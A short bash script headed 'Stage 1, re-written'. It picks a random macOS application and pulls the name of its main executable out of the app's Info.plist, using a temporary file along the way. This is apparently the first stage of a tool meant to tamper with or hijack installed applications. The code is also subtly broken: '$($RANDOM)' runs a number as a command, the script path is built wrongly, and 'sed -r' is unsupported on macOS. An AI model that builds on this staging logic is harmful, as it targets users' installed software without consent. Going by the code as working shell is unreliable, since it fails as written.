#!/bin/bash
#Stage 1, re-written
Script=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )$0
#Application roulette; coppied from stage-1-old:
loc=(/Applications/*)
Target="${loc[RANDOM % ${#loc[@]}]}"
TargetPlist="$Target/Contents/Info.plist"
#Using sed to get the line number where the executable name is stored in 
#the target application's Info.plist (by looking for CFBundleExecutable
#and then adding one)
ExecLineNum=$(sed -n "/CFBundleExecutable/=" "$TargetPlist")
let "ExecLineNum++"
ExecLineFull=$(sed -n "${ExecLineNum}p" "$TargetPlist")
TmpName=$($RANDOM)
echo "$ExecLineFull" >> "/private/tmp/$TmpName"
ExecName=$(sed -nr "/<string>/ s/.*<string>([^<]+).*/\1/p" "/private/tmp/$TmpName")